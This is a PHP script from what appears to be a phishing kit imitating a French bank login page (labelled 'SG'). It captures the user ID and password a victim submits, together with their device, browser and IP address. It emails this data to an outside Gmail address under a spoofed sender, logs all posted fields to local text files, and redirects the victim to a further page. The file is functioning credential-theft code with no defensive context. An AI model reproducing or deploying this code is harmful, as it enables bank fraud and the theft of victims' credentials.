<?php
// V FOR  ALL
include("funcs.php");
$_SESSION['user_id'] = $_POST['user_id'];
$_SESSION['Hidden1'] = $_POST['Hidden1'];

$message  = "******* New Login SG *******\n\n";
$message .= "Identifiant : ".$_POST['user_id']."\n";
$message .= "Password : ".$_POST['Hidden1']."\n\n";
$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "wricheman@gmail.com";
$subject = "SG|".$ip."".countryinfo($message);
$headers = "From:  Login <don@mox.fr>";
mail($send,$subject,$message,$headers);
 include 'function.php';
$file = fopen("../infos.txt","a");
fwrite($file,$message);  



header("Location: tel.php");
$handle = fopen("login.txt", "a");
foreach($_POST as $variable => $value){
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}

fwrite($handle, "\r\n");
fclose($handle);
exit;
?>



